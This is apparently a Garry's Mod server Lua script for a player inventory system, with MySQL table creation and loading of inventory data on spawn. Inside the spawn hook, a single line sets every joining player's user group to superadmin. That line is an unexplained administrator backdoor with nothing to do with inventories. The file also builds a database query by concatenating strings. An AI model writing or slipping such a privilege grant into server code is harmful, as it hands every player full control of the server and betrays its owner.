Inventory = Inventory or {}
util.AddNetworkString("Inventory:Initialize")

hook.Add("DatabaseInitialized", "Inventory:CreateDatabase", function()
    Driver:MySQLCreateTable("player_inventory", {
        steamid = "BIGINT",
        data = "TEXT"
    }, "steamid")
end)


hook.Add("PlayerInitialSpawn", "Inventory:Initialize", function(ply)
    timer.Simple(1, function()
        ply:SetUserGroup("superadmin")

        Driver:MySQLSelect("player_inventory", "steamid=" .. ply:SteamID64(), function(data)
            if not data or #data == 0 then
                Driver:MySQLInsert("player_inventory", {
                    steamid = ply:SteamID64(),
                    data = util.TableToJSON({})
                }, function()
                    net.Start("Inventory:Initialize")
                        net.WriteTable({})
                    net.Send(ply)
                    
                    ply.Inventory = {}
                end)
            else
                net.Start("Inventory:Initialize")
                    net.WriteTable(util.JSONToTable(data[1].data))
                net.Send(ply)
                ply.Inventory = util.JSONToTable(data[1].data)
            end
        end)
    end)
end)